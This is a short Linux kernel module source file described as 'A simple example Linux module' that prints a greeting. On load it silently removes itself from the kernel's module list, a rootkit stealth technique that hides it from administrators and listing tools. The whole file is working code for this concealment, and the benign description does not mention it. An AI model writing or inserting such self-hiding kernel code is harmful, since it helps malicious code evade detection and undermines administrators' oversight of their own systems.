#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robert W.Oliver II");
MODULE_DESCRIPTION("A simple example Linux module.");
MODULE_VERSION("0.01");

struct list_head *module_list;
int is_hidden = 0;

void hide(void)
{
    if (is_hidden) {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}


void unhide(void)
{
    if (!is_hidden) {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}

static int __init lkm_example_init(void)
{
    printk(KERN_INFO "Hello, World !\n");
    hide();
    return 0;
}

static void __exit lkm_example_exit(void)
{
    printk(KERN_INFO "Goodbye, World !\n");
    unhide();
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
